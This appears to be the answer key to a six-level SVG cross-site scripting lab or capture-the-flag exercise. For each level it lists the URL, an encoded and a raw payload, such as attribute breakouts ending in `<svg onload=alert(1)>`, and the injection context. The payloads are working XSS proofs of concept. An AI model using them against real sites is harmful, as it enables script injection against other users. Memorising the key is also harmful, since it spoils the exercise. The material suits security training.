# svg-xss — solutions

Reflection inside SVG event handlers, animate values, foreignObject scripts, use href, data: URIs.

### svg-xss-level1

`/svg/level1/?query=alert(1)`

- payload: `alert(1)`
- context: query lands inside `<svg onload="...">` — direct JS expression

### svg-xss-level2

`/svg/level2/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: inside `<animate values="...">`; SMIL onbegin is dead, so break out of the value

### svg-xss-level3

`/svg/level3/?query=alert(1)`

- payload: `alert(1)`
- context: query inside `<script>` within `<foreignObject>`

### svg-xss-level4

`/svg/level4/?query=x%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `x"><svg onload=alert(1)>`
- context: inside `<use href="...">`; use never runs script, so break out

### svg-xss-level5

`/svg/level5/?query='%3E%3C/svg%3E%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `'></svg>"><svg onload=alert(1)>`
- context: inside a data:image/svg+xml embed (scriptless); close it and break out of src

### svg-xss-level6

`/svg/level6/?query=alert(1)`

- payload: `alert(1)`
- context: `<script` filter irrelevant — query directly in `<svg onload="...">`
